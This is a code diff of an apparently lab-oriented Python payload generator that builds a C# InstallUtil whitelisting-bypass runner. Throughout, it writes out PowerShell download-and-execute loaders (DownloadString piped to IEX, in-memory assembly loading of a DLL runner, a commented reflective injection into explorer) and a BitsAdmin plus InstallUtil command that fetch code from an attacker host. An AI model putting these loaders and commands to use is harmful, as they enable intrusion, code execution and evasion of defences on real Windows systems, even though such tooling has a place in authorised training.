@@ -1,14 +1,11 @@
 #!/bin/env python3
-from ak import *
-import os
-import subprocess
+import ak
 
-LHOST = "192.168.49.65"
-LPORT = 443
 BASE_FILENAME = 'win_installutil_ps_runner'
+FN_CS = BASE_FILENAME + ".cs"
 
 # Stage2 loader:
-PS_CMD = f"(New-Object System.Net.WebClient).DownloadString('http://{LHOST}/run.txt') | IEX"
+PS_CMD = f"(New-Object System.Net.WebClient).DownloadString('http://{ak.LHOST}/run.txt') | IEX"
 #PS_CMD = r"cmd.exe /c C:\\windows\\tasks\\SharpHound.exe"
 # PS_CMD = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.65/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.49.65/InvokeReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; InvokeReflectivePEInjection -PEBytes $bytes -ProcId $procid";
 
@@ -47,29 +44,23 @@ namespace Foonaria
 """.format(PS_CMD=PS_CMD)
 
   print(template)
-  f = open(BASE_FILENAME + '.cs', "w")
-  f.write(template)
-  f.close()
+  ak.write_file(FN_CS, template)
 
   print("-"*50)
   ps_template = """
-  $data = (New-Object System.Net.WebClient).DownloadData('http://{LHOST}/DLL-Runner-x86.dll')
+  $data = (New-Object System.Net.WebClient).DownloadData('http://{lhost}/DLL-Runner-x86.dll')
   $assem = [System.Reflection.Assembly]::Load($data) 
                                                                                                       
   $class = $assem.GetType('DLL_Runner.Class1')
   $method = $class.GetMethod("runner")
   $method.Invoke(0, $null)
-  """.format(LHOST=LHOST)
+  """.format(lhost=ak.LHOST)
 
   print("Use code like this for stage2: " + ps_template)
 
-def compile():
-  cmd = f"mcs /r:libraries/System.Management.Automation.dll,libraries/System.Configuration.Install.dll {BASE_FILENAME}.cs"
-  os.system(cmd)
-
 def main():
   generate()
-  compile() 
+  ak.cs_compile(FN_CS, "/r:libraries/System.Management.Automation.dll,libraries/System.Configuration.Install.dll")
 
   print("Wrote to: "+ BASE_FILENAME + ".cs")
   print("Run with: cmd.exe /c BitsAdmin /Transfer myJob http://192.168.49.65/Bypass C:\\Windows\\tasks\\bp && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\tasks\\bp")
